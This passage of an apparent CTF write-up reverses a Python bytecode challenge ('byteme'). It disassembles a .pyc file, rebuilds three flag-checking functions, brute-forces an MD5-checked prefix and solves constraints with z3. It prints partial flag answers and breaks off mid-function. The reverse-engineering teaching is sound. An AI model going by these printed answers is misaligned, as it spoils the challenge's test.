class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000  f0 0d 0d 0a 00 00 00 00  47 16 e8 65 42 25 00 00  |........G..eB%..|</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import marshal, dis</span><br><span class="line"></span><br><span class="line">with open(&quot;byteme.pyc&quot;, &quot;rb&quot;) as file:</span><br><span class="line">    file.seek(16)</span><br><span class="line">    print(dis.dis(marshal.load(file)))</span><br></pre></td></tr></table></figure><p>Running this (with python 3.13), gives us a somewhat lenghty <a href="https://github.com/D13David/ctf-writeups/blob/main/pearlctf24/rev/byteme/decomp.asm"><code>result</code></a>. We can reverse this by hand (or we can adapt <code>pycdc</code> to support the new bytecodes). Either way, we find there are three  functions that are called and every one of them gives us one part of the flag. Lets start at the top.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">  0           0 RESUME                   0</span><br><span class="line"></span><br><span class="line">             # from hashlib import md5</span><br><span class="line">  1           2 LOAD_CONST               0 (0)</span><br><span class="line">              4 LOAD_CONST               1 ((&#x27;md5&#x27;,))</span><br><span class="line">              6 IMPORT_NAME              0 (hashlib)</span><br><span class="line">              8 IMPORT_FROM              1 (md5)</span><br><span class="line">             10 STORE_NAME               1 (md5)</span><br><span class="line">             12 POP_TOP</span><br><span class="line"></span><br><span class="line">             # import time</span><br><span class="line">  2          14 LOAD_CONST               0 (0)</span><br><span class="line">             16 LOAD_CONST               2 (None)</span><br><span class="line">             18 IMPORT_NAME              2 (time)</span><br><span class="line">             20 STORE_NAME               2 (time)</span><br><span class="line"></span><br><span class="line">             # make function for &quot;crackme&quot;</span><br><span class="line">  4          22 LOAD_CONST               3 (&lt;code object crackme at 0x558a3158ccd0, file &quot;byteme.py&quot;, line 4&gt;)</span><br><span class="line">             24 MAKE_FUNCTION</span><br><span class="line">             26 STORE_NAME               3 (crackme)</span><br><span class="line"></span><br><span class="line">             # make function for &quot;solveme&quot;</span><br><span class="line"> 55          28 LOAD_CONST               4 (&lt;code object solveme at 0x558a315b3210, file &quot;byteme.py&quot;, line 55&gt;)</span><br><span class="line">             30 MAKE_FUNCTION</span><br><span class="line">             32 STORE_NAME               4 (solveme)</span><br><span class="line"></span><br><span class="line">             # make function for &quot;breakme&quot;</span><br><span class="line">142          34 LOAD_CONST               5 (&lt;code object breakme at 0x558a31538040, file &quot;byteme.py&quot;, line 142&gt;)</span><br><span class="line">             36 MAKE_FUNCTION</span><br><span class="line">             38 STORE_NAME               5 (breakme)</span><br><span class="line"></span><br><span class="line">             # if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">245          40 LOAD_NAME                6 (__name__)</span><br><span class="line">             42 LOAD_CONST               6 (&#x27;__main__&#x27;)</span><br><span class="line">             44 COMPARE_OP              88 (bool(==))</span><br><span class="line">             48 POP_JUMP_IF_FALSE       97 (to 246)</span><br><span class="line"></span><br><span class="line">             # spell = crackme()</span><br><span class="line">246          52 LOAD_NAME                3 (crackme)</span><br><span class="line">             54 PUSH_NULL</span><br><span class="line">             56 CALL                     0</span><br><span class="line">             64 STORE_NAME               7 (spell)</span><br><span class="line"></span><br><span class="line">             # answer = solveme()</span><br><span class="line">247          66 LOAD_NAME                4 (solveme)</span><br><span class="line">             68 PUSH_NULL</span><br><span class="line">             70 CALL                     0</span><br><span class="line">             78 STORE_NAME               8 (answer)</span><br><span class="line"></span><br><span class="line">             # chain = breakme()</span><br><span class="line">248          80 LOAD_NAME                5 (breakme)</span><br><span class="line">             82 PUSH_NULL</span><br><span class="line">             84 CALL                     0</span><br><span class="line">             92 STORE_NAME               9 (chain)</span><br><span class="line"></span><br><span class="line">             # print(&#x27;Thalor has risen!&#x27;)</span><br><span class="line">250          94 LOAD_NAME               10 (print)</span><br><span class="line">             96 PUSH_NULL</span><br><span class="line">             98 LOAD_CONST               7 (&#x27;Thalor has risen!&#x27;)</span><br><span class="line">            100 CALL                     1</span><br><span class="line">            108 POP_TOP</span><br><span class="line"></span><br><span class="line">            # print(&#x27;The prophecy has been fulfilled&#x27;)</span><br><span class="line">251         110 LOAD_NAME               10 (print)</span><br><span class="line">            112 PUSH_NULL</span><br><span class="line">            114 LOAD_CONST               8 (&#x27;The prophecy has been fulfilled&#x27;)</span><br><span class="line">            116 CALL                     1</span><br><span class="line">            124 POP_TOP</span><br><span class="line"></span><br><span class="line">            # print()</span><br><span class="line">252         126 LOAD_NAME               10 (print)</span><br><span class="line">            128 PUSH_NULL</span><br><span class="line">            130 CALL                     0</span><br><span class="line">            138 POP_TOP</span><br><span class="line"></span><br><span class="line">            # print(&#x27;#######################################&#x27;)</span><br><span class="line">253         140 LOAD_NAME               10 (print)</span><br><span class="line">            142 PUSH_NULL</span><br><span class="line">            144 LOAD_CONST               9 (&#x27;#######################################&#x27;)</span><br><span class="line">            146 CALL                     1</span><br><span class="line">            154 POP_TOP</span><br><span class="line"></span><br><span class="line">            # print(&#x27;##                                 ##&#x27;)</span><br><span class="line">254         156 LOAD_NAME               10 (print)</span><br><span class="line">            158 PUSH_NULL</span><br><span class="line">            160 LOAD_CONST              10 (&#x27;##&#x27;)</span><br><span class="line">            162 LOAD_CONST              11 (&#x27;                                 &#x27;)</span><br><span class="line">            164 LOAD_CONST              10 (&#x27;##&#x27;)</span><br><span class="line">            166 CALL                     3</span><br><span class="line">            174 POP_TOP</span><br><span class="line"></span><br><span class="line">            # print(f&#x27;## &#123;spell&#125;&#123;answer&#125;&#123;chain&#125; ##&#x27;)</span><br><span class="line">255         176 LOAD_NAME               10 (print)</span><br><span class="line">            178 PUSH_NULL</span><br><span class="line">            180 LOAD_CONST              10 (&#x27;##&#x27;)</span><br><span class="line">            182 LOAD_NAME                7 (spell)</span><br><span class="line">            184 FORMAT_SIMPLE</span><br><span class="line">            186 LOAD_NAME                8 (answer)</span><br><span class="line">            188 FORMAT_SIMPLE</span><br><span class="line">            190 LOAD_NAME                9 (chain)</span><br><span class="line">            192 FORMAT_SIMPLE</span><br><span class="line">            194 BUILD_STRING             3</span><br><span class="line">            196 LOAD_CONST              10 (&#x27;##&#x27;)</span><br><span class="line">            198 CALL                     3</span><br><span class="line">            206 POP_TOP</span><br><span class="line"></span><br><span class="line">            # print(&#x27;##                                 ##&#x27;)</span><br><span class="line">256         208 LOAD_NAME               10 (print)</span><br><span class="line">            210 PUSH_NULL</span><br><span class="line">            212 LOAD_CONST              10 (&#x27;##&#x27;)</span><br><span class="line">            214 LOAD_CONST              11 (&#x27;                                 &#x27;)</span><br><span class="line">            216 LOAD_CONST              10 (&#x27;##&#x27;)</span><br><span class="line">            218 CALL                     3</span><br><span class="line">            226 POP_TOP</span><br><span class="line"></span><br><span class="line">            # print(&#x27;#######################################&#x27;)</span><br><span class="line">257         228 LOAD_NAME               10 (print)</span><br><span class="line">            230 PUSH_NULL</span><br><span class="line">            232 LOAD_CONST               9 (&#x27;#######################################&#x27;)</span><br><span class="line">            234 CALL                     1</span><br><span class="line">            242 POP_TOP</span><br><span class="line">            244 RETURN_CONST             2 (None)</span><br><span class="line"></span><br><span class="line">245     &gt;&gt;  246 RETURN_CONST             2 (None)</span><br></pre></td></tr></table></figure><p>​    </p><p>Or in vanilla python:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from hashlib import md5</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def crackme():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def solveme():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def breakme():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    spell = crackme()</span><br><span class="line">    answer = solveme()</span><br><span class="line">    chain = breakme()</span><br><span class="line"></span><br><span class="line">    print(&#x27;Thalor has risen!&#x27;)</span><br><span class="line">    print(&#x27;The prophecy has been fulfilled&#x27;)</span><br><span class="line">    print()</span><br><span class="line">    print(&#x27;#######################################&#x27;)</span><br><span class="line">    print(&#x27;##                                   ##&#x27;)</span><br><span class="line">    print(f&#x27;## &#123;spell&#125;&#123;answer&#125;&#123;chain&#125; ##&#x27;)</span><br><span class="line">    print(&#x27;##                                   ##&#x27;)</span><br><span class="line">    print(&#x27;#######################################&#x27;)</span><br></pre></td></tr></table></figure><p>​    </p><p>Next on <code>crackme</code>. Doing the transformation of disassembly to python code by hand, gives us the following:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">def crackme():</span><br><span class="line">    print(&quot;                           o                    \n                       _---|         _ _ _ _ _ \n                    o   ---|     o   ]-I-I-I-[ \n   _ _ _ _ _ _  _---|      | _---|    \\ ` &#x27; / \n   ]-I-I-I-I-[   ---|      |  ---|    |.   | \n    \\ `   &#x27;_/       |     / \\    |    | /^\\| \n     [*]  __|       ^    / ^ \\   ^    | |*|| \n     |__   ,|      / \\  /    `\\ / \\   | ===| \n  ___| ___ ,|__   /    /=_=_=_=\\   \\  |,  _|\n  I_I__I_I__I_I  (====(_________)___|_|____|____\n  \\-\\--|-|--/-/  |     I  [ ]__I I_I__|____I_I_| \n   |[]      &#x27;|   | []  |`__  . [  \\-\\--|-|--/-/  \n   |.   | |&#x27; |___|_____I___|___I___|---------| \n  / \\| []   .|_|-|_|-|-|_|-|_|-|_|-| []   [] | \n &lt;===&gt;  |   .|-=-=-=-=-=-=-=-=-=-=-|   |    / \\  \n ] []|`   [] ||.|.|.|.|.|.|.|.|.|.||-      &lt;===&gt; \n ] []| ` |   |/////////\\\\\\\\\\.||__.  | |[] [ \n &lt;===&gt;     &#x27; ||||| |   |   | ||||.||  []   &lt;===&gt;\n  \\T/  | |-- ||||| | O | O | ||||.|| . |&#x27;   \\T/ \n   |      . _||||| |   |   | ||||.|| |     | |\n../|&#x27; v . | .|||||/____|____\\|||| /|. . | . ./\n.|//\\............/...........\\........../../\\\n&quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    print(&quot;Welcome Warrior! You have made it till here&quot;)</span><br><span class="line">    print(&quot;This is where best of the best have fallen prey to the fate&quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    print(&quot;It is written that only the true Thalor can get The sword of Eldoria&quot;)</span><br><span class="line">    print(&quot;Do you have what it takes to be Thalor?&quot;)</span><br><span class="line">    print(&quot;Prove your mettle by bringing the sword out of the castle&quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    print(&quot;Go on! unlock the castle with XEKLEIDOMA spell&quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    spell = input(&quot;&gt; &quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    if len(spell.strip()) != 12 or md5(spell.strip().encode()).hexdigest() != &quot;9ce86143889d80b01586f8a819d20f0c&quot;:</span><br><span class="line">        print(&quot;You are not THE ONE&quot;)</span><br><span class="line">        print(&quot;True Thalor is a master of sorcery&quot;)</span><br><span class="line">        print(&quot;Ground beneath you opens up and you fall into the depths of hell&quot;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    print(&quot;The door is opened!&quot;)</span><br><span class="line">    print(&quot;You surely mastered sorcery&quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    time.sleep(3)</span><br><span class="line"></span><br><span class="line">    return spell</span><br></pre></td></tr></table></figure><p>​    </p><p>So we need to find a input with length of  12 characters and with the matching hashsum. Since we can assume that we need to pass in the flag, we know the first 6 characters already due to the flag format: <code>pearl&#123;</code>. The remaining 6 characters we can bruteforce:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">def generate_permutations():</span><br><span class="line">    characters = &#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span><br><span class="line">    permutations = itertools.product(characters, repeat=6)</span><br><span class="line">    return (&#x27;&#x27;.join(p) for p in permutations)</span><br><span class="line"></span><br><span class="line">def calculate_md5(text):</span><br><span class="line">    return hashlib.md5(text.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    for permutation in generate_permutations():</span><br><span class="line">        md5_hash = calculate_md5(&quot;pearl&#123;&quot; + permutation)</span><br><span class="line">        if md5_hash in &quot;9ce86143889d80b01586f8a819d20f0c&quot;:</span><br><span class="line">            print(permutation)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><p>​    </p><p>Running this, gives us the magic spell <code>pearl&#123;e4sy_p</code>. The second function is <code>solveme</code> and the reconstructed code looks like the following:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">def solveme():</span><br><span class="line">    print(&quot;\n                                            .&quot;&quot;--..__\n                     _                     []       ``-.._\n                  .\&#x27;` `\&#x27;.                  ||__           `-._\n</span><br><span class="line">  /    ,-.\\                 ||_ ```---..__     `-.\n                /    /:::\\               /|//&#125;          ``--._  `.\n                |    |:::||              |////&#125;                `. |\n                |    |:::||             //\&#x27;///                   -\n                |    |:::||            //  ||\&#x27;     \n                /    |:::|/        _,-//\\  ||\n               /`    |:::|`-,__,-\&#x27;`  |/  \\ ||\n             /`  |   |\&#x27;\&#x27; ||           \\   |||\n           /`    \\   |   ||            |  /||\n         |`       |  |   |)            \\ | ||\n        |          \\ |   /      ,.__    \\| ||\n        /           `         /`    `\\   | ||\n       |                     /        \\  / ||\n       |                     |        | /  ||\n       /         /           |        `(   ||\n      /          .           /</span><br><span class="line">)  ||\n     |            \\          |     ________||\n    /             |          /     `-------.|\n   |\\            /          |              ||\n   \\/`-._       |           /              ||\n    //   `.    /`           |              ||\n   //`.    `. |             \\              ||\n  ///\\ `-._  )/             |              ||\n //// )   .(/               |              ||\n ||||   ,\&#x27;` )               /              //\n ||||  /                    /             || \n `\\` /`                    |             // \n     |`                     \\            ||  \n    /                        |           //  \n  /`                          \\         //   \n/`                            |        ||    \n`-.___,-.      .-.        ___,\&#x27;        (/    \n         `---\&#x27;`   `\&#x27;----\&#x27;`\n&quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    print(&quot;As you walk in, you see a spectral figure Elyrian, the Guardian of Souls&quot;)</span><br><span class="line">    print(&quot;He speaks to you in a voice that echoes through the chamber&quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    print(&#x27;&quot;Brave warrior, before you lies the next trial on your path. Answer my riddle, and prove your worthiness to continue your quest.&quot;&#x27;)</span><br><span class="line">    print(&#x27;\n&quot;I am a word of ten, with numbers and letters blend,\nUnravel me, and secrets I\&#x27;ll send.\nThough cryptic in sight, I hold the code tight,\nUnlock my mystery with wit and might.&quot;\n&#x27;)</span><br><span class="line"></span><br><span class="line">    answer = input(&quot;&gt; &quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    answer = list(map(ord, list(answer.strip())))</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        assert(len(answer) == 10)</span><br><span class="line">        assert(answer[6] + answer[7] + answer[8] - answer[5] == 190)</span><br><span class="line">        assert(answer[6] + answer[5] + answer[5] - answer[2] == 202)</span><br><span class="line">        assert(answer[9] + answer[3] + answer[2] + answer[5] == 433)</span><br><span class="line">        assert(answer[7] + answer[0] - answer[0] + answer[3] == 237)</span><br><span class="line">        assert(answer[1] - answer[9] - answer[5] + answer[4] == -50)</span><br><span class="line">        assert(answer[2] - answer[3] + answer[1] - answer[1] == -6)</span><br><span class="line">        assert(answer[8] - answer[7] - answer[6] + answer[5] == -88)</span><br><span class="line">        assert(answer[0] + answer[8] - answer[5] - answer[3] == -117)</span><br><span class="line">        assert(answer[5] + answer[6] + answer[8] + answer[2] == 385)</span><br><span class="line">        assert(answer[5] - answer[4] - answer[5] + answer[9] == 4)</span><br><span class="line">        assert(answer[2] - answer[9] + answer[5] - answer[0] == 63)</span><br><span class="line">        assert(answer[2] - answer[5] + answer[4] - answer[9] == 13)</span><br><span class="line">        assert(answer[8] + answer[3] + answer[7] - answer[6] == 167)</span><br><span class="line">        assert(answer[6] - answer[5] - answer[0] - answer[5] == -126)</span><br><span class="line">        assert(answer[2] - answer[5] - answer[6] - answer[4] == -199)</span><br><span class="line">    except AssertionError:</span><br><span class="line">        print(&quot;You are not worthy&quot;)</span><br><span class="line">        print(&quot;Your soul has been cursed&quot;)</span><br><span class="line">        print(&quot;You will seek your own death in a fortnight&quot;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    print(&quot;You have proven your `wit and might`&quot;)</span><br><span class="line">    print(&quot;Elyrian, the Guardian of Souls, bows to you&quot;)</span><br><span class="line">    print(&quot;You have unlocked the next chamber&quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    time.sleep(4)</span><br><span class="line"></span><br><span class="line">    return &quot;&quot;.join([chr(x) for x in answer])</span><br></pre></td></tr></table></figure><p>​    </p><p>This time, the user input needs to be 10  characters and we have a whole lot of constraints that need to be  fulfilled. Constraints call for <code>SAT</code>, so we use <code>z3</code> to get the answer.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">answer = [Int(f&quot;answer&#123;i&#125;&quot;) for i in range(10)]</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">solver.add(answer[6] + answer[7] + answer[8] - answer[5] &gt;= 190)</span><br><span class="line">solver.add(answer[6] + answer[5] + answer[5] - answer[2] &gt;= 202)</span><br><span class="line">solver.add(answer[9] + answer[3] + answer[2] + answer[5] &gt;= 433)</span><br><span class="line">solver.add((answer[7] + answer[0] - answer[0]) + answer[3] &gt;= 237)</span><br><span class="line">solver.add((answer[1] - answer[9] - answer[5]) + answer[4] &gt;= -50)</span><br><span class="line">solver.add((answer[2] - answer[3]) + answer[1] - answer[1] &gt;= -6)</span><br><span class="line">solver.add((answer[8] - answer[7] - answer[6]) + answer[5] &gt;= -88)</span><br><span class="line">solver.add(answer[0] + answer[8] - answer[5] - answer[3] &gt;= -117)</span><br><span class="line">solver.add(answer[5] + answer[6] + answer[8] + answer[2] &gt;= 385)</span><br><span class="line">solver.add((answer[5] - answer[4] - answer[5]) + answer[9] &gt;= 4)</span><br><span class="line">solver.add((answer[2] - answer[9]) + answer[5] - answer[0] &gt;= 63)</span><br><span class="line">solver.add((answer[2] - answer[5]) + answer[4] - answer[9] &gt;= 13)</span><br><span class="line">solver.add(answer[8] + answer[3] + answer[7] - answer[6] &gt;= 167)</span><br><span class="line">solver.add(answer[6] - answer[5] - answer[0] - answer[5] &gt;= -126)</span><br><span class="line">solver.add(answer[2] - answer[5] - answer[6] - answer[4] &gt;= -199)</span><br><span class="line"></span><br><span class="line">if solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    print(&quot;Solution found:&quot;)</span><br><span class="line">    for i in range(10):</span><br><span class="line">        print(f&quot;&#123;chr(model[answer[i]].as_long())&#125;&quot;, end=&quot;&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;No solution found&quot;)</span><br></pre></td></tr></table></figure><p>​    </p><p>Running this gives us the second part of the flag: <code>34sy_byt3c</code>. One part to go… Moving on to <code>breakme</code>. The reconstructed code looks like this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">def breakme():</span><br><span class="line">    sword = &quot;\n                      _..._\n                     /MMMMM\\\n                    (I8H#H8I)\n                    (I8H#H8I)\n                     \\WWWWW/\n                      I._.I\n</span><br><span class="line">          I._.I\n                      I._.I\n                      I._.I\n                      I._.I\n                      I._.I\n                      I._.I\n                      I.,.I\n</span><br><span class="line">   / /#\\ \\\n                   .dH# # #Hb.\n               _.~d#XXP I 7XX#b~,_\n            _.dXV^XP^ Y X Y ^7X^VXb._\n           /AP^   \\PY   Y   Y7/   ^VA\\\n          /8/      \\PP  I  77/      \\8\\\n         /J/        IV     VI        \\L\\\n         L|         |  \\ /  |         |J\n         V          |  | |  |          V\n                    |  | |  |\n                    |  | |  |\n</span><br><span class="line">|  | |  |\n                    |  | |  |\n _                  |  | |  |                  _\n( \\                 |  | |  |                 / )\n \\ \\                |  | |  |                / /\n(&#x27;\\ \\               |  | |  |               / /`)\n \\ \\ \\              |  | |  |              / / /\n(&#x27;\\ \\ \\             |  | |  |             / / /`)\n \\ \\ \\ )            |  | |  |            ( / / /\n(&#x27;\\ \\( )            |  | |  |            ( )/ /`)\n \\ \\ ( |            |  | |  |            | ) / /\n  \\ \\( |            |  | |  |            | )/ /\n   \\ ( |            |  | |  |            | ) /\n    \\( |            |   Y   |            | )/\n     | |            |   |   |            | |\n     J | ___...~~--&#x27;|   |   |`--~~...___ | L\n     &gt;-+&lt;...___     |   |   |     ___...&gt;+-&lt;\n    /     __   `--~.L___L___J.~--&#x27;   __     \\\n    K    /  ` --.     d===b     .-- &#x27;  \\    H\n    \\_._/        \\   // I \\   /        \\_._/\n      `--~.._     \\__\\ I //__/     _..~--&#x27;\n             `--~~..____ ____..~~--&#x27;\n</span><br><span class="line">     |   T   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    I   &#x27;   I\n                     \\     /\n                      \\   /\n                       \\ /\n                       &quot;</span><br><span class="line"></span><br><span class="line">    sword = sword.split(&quot;\n&quot;)</span><br><span class="line">    for line in sword:</span><br><span class="line">        print(line)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line"></span><br><span class="line">    print()</span><br><span class="line">    print(&quot;There it is! The sword of Eldoria&quot;)</span><br><span class="line">    print(&quot;Break it&#x27;s shackles and show that you are the Thalor&quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    chain = input(&quot;&gt; &quot;)</span><br><span class="line"></span><br><span class="line">    best = [117, 84, 87, 108, 59, 85, 66, 71, 71, 30, 16]</span><br><span class="line">    mod = []</span><br><span class="line">    plier = 69</span><br><span class="line"></span><br><span class="line">    for i in range(len(chain)):</span><br><span class="line">        mod.append(ord(chain[i]) ^ plier)</span><br><span class="line">        plier = ord(chain[i])</span><br><span class="line"></span><br><span class="line">    if mod == best:</span><br><span class="line">        print(&quot;Oh! True Thalor, you have broken the shackles&quot;)</span><br><span class="line">        print(&quot;You are the chosen one&quot;)</span><br><span class="line">        print(&quot;I kneel before you&quot;)</span><br><span class="line">        print(&quot;Go 